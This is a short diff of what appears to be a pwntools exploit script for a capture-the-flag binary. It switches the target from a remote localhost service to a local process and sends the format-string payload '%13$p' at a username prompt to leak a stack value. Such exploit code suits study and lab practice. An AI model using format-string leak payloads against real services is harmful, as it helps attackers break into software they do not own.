@@ -14,8 +14,8 @@ c
 """
 
 # io = gdb.debug(path, gdbscript=gdbscript)
-# io = process(path)
-io = remote("localhost", 1337)
+io = process(path)
+# io = remote("localhost", 1337)
 
 payload = b"%13$p"
 io.sendlineafter(b"Username:", payload)
